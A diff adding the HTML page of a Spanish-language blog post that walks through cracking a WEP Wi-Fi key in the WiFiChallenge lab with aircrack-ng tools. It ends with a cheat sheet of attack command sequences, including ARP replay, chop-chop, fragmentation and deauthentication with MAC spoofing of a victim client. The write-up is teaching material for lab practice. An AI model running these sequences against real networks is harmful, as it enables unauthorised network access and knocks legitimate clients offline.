@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Hacking Wifi - WEP | MiguelRega7 - blog</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="Hacking Wifi - WEP" />
+<meta name="author" content="MiguelRega7" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Posts sobre resolución de CTFs y ciberseguridad." />
+<meta property="og:description" content="Posts sobre resolución de CTFs y ciberseguridad." />
+<link rel="canonical" href="http://localhost:4000/hacking-wifi/wep/2024/03/21/hacking_web.html" />
+<meta property="og:url" content="http://localhost:4000/hacking-wifi/wep/2024/03/21/hacking_web.html" />
+<meta property="og:site_name" content="MiguelRega7 - blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-03-21T00:00:00-06:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Hacking Wifi - WEP" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"MiguelRega7"},"dateModified":"2024-03-21T00:00:00-06:00","datePublished":"2024-03-21T00:00:00-06:00","description":"Posts sobre resolución de CTFs y ciberseguridad.","headline":"Hacking Wifi - WEP","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hacking-wifi/wep/2024/03/21/hacking_web.html"},"url":"http://localhost:4000/hacking-wifi/wep/2024/03/21/hacking_web.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="MiguelRega7 - blog" />
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">MiguelRega7 - blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Hacking Wifi - WEP</h1>
+    <p class="post-meta"><time class="dt-published" datetime="2024-03-21T00:00:00-06:00" itemprop="datePublished">
+        Mar 21, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p align="center">
+<img src="/assets/wifi/hacking-web/icon.png" />
+</p>
+
+<h2 id="introducción-wep">Introducción WEP</h2>
+
+<ul>
+  <li>Wired Equivalent Privacy (Privacidad Equivalente a la Conexión por Cable), es un protocolo de seguridad diseñado para proteger las redes inalámbricas. Fue uno de los primeros estándares de seguridad utilizado en redes Wi-Fi, pero se considera obsoleto y se ha vuelto vulnerable a ataques, este protocolo cifra el tráfico con una clave hexadecimal de <strong>64 o 128 bits</strong> todo el tráfico se cifra con una única clave.</li>
+</ul>
+
+<blockquote>
+  <p>WEP utiliza un esquema de cifrado de clave compartida, donde todas las estaciones en la red comparten una clave secreta. El problema principal con WEP es que presenta debilidades significativas en su implementación del cifrado, lo que hace que sea relativamente fácil para los atacantes interceptar y descifrar el tráfico de la red. Los ataques a WEP incluyen la recopilación de paquetes y el uso de herramientas como Aircrack-ng para descifrar la clave.</p>
+</blockquote>
+
+<h2 id="creando-un-ap-que-use-el-protocolo-wep">Creando un AP que use el protocolo WEP</h2>
+
+<ul>
+  <li>En caso de que quieras desplegar el <strong>AP</strong> tu mismo puedes seguir estos pasos para hacerlo exitosamente <a href="https://tonyharris.io/posts/virtual_wifi_lab/">https://tonyharris.io/posts/virtual_wifi_lab/</a> en mi caso estare empleando el <strong>AP</strong> ya desplegado del <strong>WifiChallengev2</strong> <a href="https://wifichallengelab.com/">https://wifichallengelab.com/</a>.</li>
+</ul>
+
+<h2 id="atacando-el-protocolo-wep">Atacando el protocolo WEP</h2>
+
+<ul>
+  <li>Bueno lo primero que haremos es poner nuestra antena de red en modo monitor en caso de estar empleando el lab de <strong>wifichallenge</strong> ya tiene integrada la interfaz asi que solo haremos lo siguiente.</li>
+</ul>
+
+<blockquote>
+  <p>Las partes censuradas es por que hay mas usuarios completando el laboratorio para evitar una mala experiencia y meterme en problemas con el creador lo hare de esa forma.</p>
+</blockquote>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@WiFiChallengeLab:/home/user/AP# airmon-ng start wlan0
+
+Found 5 processes that could cause trouble.
+Kill them using <span class="s1">'airmon-ng check kill'</span> before putting
+the card <span class="k">in </span>monitor mode, they will interfere by changing channels
+and sometimes putting the interface back <span class="k">in </span>managed mode
+
+    PID Name
+    611 avahi-daemon
+    614 NetworkManager
+    633 wpa_supplicant
+    665 avahi-daemon
+    945 ifplugd
+
+PHY	Interface	Driver		Chipset
+
+phy0	wlan0		mac80211_hwsim	Software simulator of 802.11 radio<span class="o">(</span>s<span class="o">)</span> <span class="k">for </span>mac80211
+
+		<span class="o">(</span>mac80211 monitor mode vif enabled <span class="k">for</span> <span class="o">[</span>phy0]wlan0 on <span class="o">[</span>phy0]wlan0mon<span class="o">)</span>
+		<span class="o">(</span>mac80211 station mode vif disabled <span class="k">for</span> <span class="o">[</span>phy0]wlan0<span class="o">)</span>
+phy1	wlan1		mac80211_hwsim	Software simulator of 802.11 radio<span class="o">(</span>s<span class="o">)</span> <span class="k">for </span>mac80211
+phy2	wlan2		mac80211_hwsim	Software simulator of 802.11 radio<span class="o">(</span>s<span class="o">)</span> <span class="k">for </span>mac80211
+phy3	wlan3		mac80211_hwsim	Software simulator of 802.11 radio<span class="o">(</span>s<span class="o">)</span> <span class="k">for </span>mac80211
+phy4	wlan4		mac80211_hwsim	Software simulator of 802.11 radio<span class="o">(</span>s<span class="o">)</span> <span class="k">for </span>mac80211
+phy5	wlan5		mac80211_hwsim	Software simulator of 802.11 radio<span class="o">(</span>s<span class="o">)</span> <span class="k">for </span>mac80211
+phy6	wlan6		mac80211_hwsim	Software simulator of 802.11 radio<span class="o">(</span>s<span class="o">)</span> <span class="k">for </span>mac80211
+phy60	wlan60		mac80211_hwsim	Software simulator of 802.11 radio<span class="o">(</span>s<span class="o">)</span> <span class="k">for </span>mac80211
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora matamos los procesos que no nos sirven.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@WiFiChallengeLab:/home/user/AP# airmon-ng check <span class="nb">kill
+
+</span>Killing these processes:
+
+    PID Name
+    633 wpa_supplicant
+    945 ifplugd
+ 406555 avahi-daemon
+ 406769 avahi-daemon
+
+root@WiFiChallengeLab:/home/user/AP# 
+</code></pre></div></div>
+
+<ul>
+  <li>Una vez hecho esto comenzamos capturando el trafico en este caso vemos que el <strong>AP</strong> existe y esta operativo.</li>
+</ul>
+
+<p align="center">
+<img src="https://i.imgur.com/tGjkeMj.png" />
+</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ airodump-ng wlan0mon
+</code></pre></div></div>
+
+<ul>
+  <li>Y bueno hay un cliente asociado a ese <strong>AP</strong> vamos a estar capturando paquetes en la columna de <strong>Data</strong> entre mas tengamos mas probabilidades hay de crackear la contraseña.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@WiFiChallengeLab:/home/user/AP# airodump-ng wlan0mon <span class="nt">-c</span> 1 <span class="nt">-w</span> captura
+</code></pre></div></div>
+
+<ul>
+  <li>Podemos ver que ya hemos recolectado muchos.</li>
+</ul>
+
+<p align="center">
+<img src="https://i.imgur.com/OABgdbb.png" />
+</p>
+
+<ul>
+  <li>Una vez paramos el ataque podemos hacer lo siguiente para crackear la contraseña.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@WiFiChallengeLab:/home/user/AP# aircrack-ng captura-01.cap <span class="nt">-w</span> /root/wifi-rockyou.txt
+</code></pre></div></div>
+
+<ul>
+  <li>En caso de no encontrar la contraseña veras algo como esto <strong>Si la contraseña fue encontrada la veras en texto plano</strong>..</li>
+</ul>
+
+<p align="center">
+<img src="https://i.imgur.com/yzgc60n.png" />
+</p>
+
+<ul>
+  <li>Ahora podemos usar otra herramienta que es <strong>besside-ng</strong> ya que esta herramienta esta diseñada para encontrar claves <strong>WEP</strong> solo le pasamos la <strong>MAC</strong> y el canal en el que opera.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@WiFiChallengeLab:/home/user/AP# besside-ng <span class="nt">-c</span> 1 <span class="nt">-b</span> F0:9F:C2:AA:19:29 wlan2
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora podemos ver la <strong>KEY</strong>.</li>
+</ul>
+
+<p align="center">
+<img src="https://i.imgur.com/5hWf7M7.png" />
+</p>
+
+<h2 id="mas-ataques">Mas ataques</h2>
+
+<ul>
+  <li>Este protocolo esta obsoleto pero aqui te comparto mas ataques.</li>
+</ul>
+
+<h1 id="fake-authentication-attack">Fake Authentication Attack</h1>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ airodump-ng –c &lt;Canal_AP&gt; <span class="nt">--bssid</span> &lt;BSSID&gt; <span class="nt">-w</span> &lt;nombreCaptura&gt; wlan0mon
+❯ aireplay-ng <span class="nt">-1</span> 0 <span class="nt">-a</span> &lt;BSSID&gt; <span class="nt">-h</span> &lt;nuestraMAC&gt; <span class="nt">-e</span> &lt;ESSID&gt; wlan0mon
+❯ aireplay-ng <span class="nt">-2</span> –p 0841 –c FF:FF:FF:FF:FF:FF –b &lt;BSSID&gt; <span class="nt">-h</span> &lt;nuestraMAC&gt; wlan0mon
+❯ aircrack-ng –b &lt;BSSID&gt; &lt;archivoPCAP&gt;
+</code></pre></div></div>
+
+<h1 id="arp-replay-attack">ARP Replay Attack</h1>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ airodump-ng –c &lt;Canal_AP&gt; <span class="nt">--bssid</span> &lt;BSSID&gt; <span class="nt">-w</span> &lt;nombreCaptura&gt; wlan0mon
+❯ aireplay-ng <span class="nt">-3</span> –x 1000 –n 1000 –b &lt;BSSID&gt; <span class="nt">-h</span> &lt;nuestraMAC&gt; wlan0mon
+❯ aircrack-ng –b &lt;BSSID&gt; &lt;archivoPCAP&gt;
+</code></pre></div></div>
+
+<h1 id="chop-chop-attack">Chop Chop Attack</h1>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ airodump-ng –c &lt;Canal_AP&gt; <span class="nt">--bssid</span> &lt;BSSID&gt; <span class="nt">-w</span> &lt;nombreArchivo&gt; wlan0mon
+❯ aireplay-ng <span class="nt">-1</span> 0 –e &lt;ESSID&gt; <span class="nt">-a</span> &lt;BSSID&gt; <span class="nt">-h</span> &lt;nuestraMAC&gt; wlan0mon
+❯ aireplay-ng <span class="nt">-4</span> –b &lt;BSSID&gt; <span class="nt">-h</span> &lt;nuestraMAC&gt; wlan0mon
+ <span class="c"># Presionamos ‘y’ ;</span>
+❯ packetforge-ng <span class="nt">-0</span> –a &lt;BSSID&gt; <span class="nt">-h</span> &lt;nuestraMAC&gt; <span class="nt">-k</span> &lt;SourceIP&gt; <span class="nt">-l</span> &lt;DestinationIP&gt; <span class="nt">-y</span> &lt;XOR_PacketFile&gt; <span class="nt">-w</span> &lt;FileName2&gt;
+❯ aireplay-ng <span class="nt">-2</span> –r &lt;FileName2&gt; wlan0mon
+❯ aircrack-ng &lt;archivoPCAP&gt;
+</code></pre></div></div>
+
+<h1 id="fragmentation-attack">Fragmentation Attack</h1>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ airodump-ng –c &lt;Canal_AP&gt; <span class="nt">--bssid</span> &lt;BSSID&gt; <span class="nt">-w</span> &lt;nombreArchivo&gt; wlan0mon
+❯ aireplay-ng <span class="nt">-1</span> 0 –e &lt;ESSID&gt; <span class="nt">-a</span> &lt;BSSID&gt; <span class="nt">-h</span> &lt;nuestraMAC&gt; wlan0mon
+❯ aireplay-ng <span class="nt">-5</span> –b&lt;BSSID&gt; <span class="nt">-h</span> &lt;nuestraMAC <span class="o">&gt;</span> wlan0mon
+<span class="c"># Presionamos ‘y’ ;</span>
+❯ packetforge-ng <span class="nt">-0</span> –a &lt;BSSID&gt; <span class="nt">-h</span> &lt;nuestraMAC&gt; <span class="nt">-k</span> &lt;SourceIP&gt; <span class="nt">-l</span> &lt;DestinationIP&gt; <span class="nt">-y</span> &lt;XOR_PacketFile&gt; <span class="nt">-w</span> &lt;FileName2&gt;
+❯ aireplay-ng <span class="nt">-2</span> –r &lt;FileName2&gt; wlan0mon
+❯ aircrack-ng &lt;archivoPCAP&gt;
+</code></pre></div></div>
+
+<h1 id="ska-type-cracking">SKA Type Cracking</h1>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ airmon-ng start wlan0
+❯ airodump-ng –c &lt;Canal_AP&gt; <span class="nt">--bssid</span> &lt;BSSID&gt; <span class="nt">-w</span> &lt;nombreArchivo&gt; wlan0mon
+❯ aireplay-ng <span class="nt">-0</span> 10 –a &lt;BSSID&gt; <span class="nt">-c</span> &lt;macVictima&gt; wlan0mon
+❯ ifconfig wlan0mon down
+❯ macchanger –-mac &lt;macVictima&gt; wlan0mon
+❯ fconfig wlan0mon up
+❯ aireplay-ng <span class="nt">-3</span> –b &lt;BSSID&gt; <span class="nt">-h</span> &lt;macFalsa&gt; wlan0mon
+❯ aireplay-ng –-deauth 1 –a &lt;BSSID&gt; <span class="nt">-h</span> &lt;macFalsa&gt; wlan0mon
+❯ aircrack-ng &lt;archivoPCAP&gt;
+</code></pre></div></div>
+
+  </div><a class="u-url" href="/hacking-wifi/wep/2024/03/21/hacking_web.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+        <p class="feed-subscribe">
+          <a href="http://localhost:4000/feed.xml">
+            <svg class="svg-icon orange">
+              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
+            </svg><span>Subscribe</span>
+          </a>
+        </p>
+        <ul class="contact-list">
+          <li class="p-name">MiguelRega7</li>
+          
+        </ul>
+      </div>
+      <div class="footer-col">
+        <p>Posts sobre resolución de CTFs y ciberseguridad.
+</p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"><li>
+  <a rel="me" href="https://github.com/MikeRega7" target="_blank" title="github">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#github"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.instagram.com/_darkhorse77?igsh=MWZqYTAyYnJmYWZrdg%3D%3D&utm_source=qr" target="_blank" title="instagram">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#instagram"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" title="linkedin">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#linkedin"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://twitter.com/MiguelJmrn7" target="_blank" title="twitter">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#twitter"></use>
+    </svg>
+  </a>
+</li>
+</ul>
+</div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
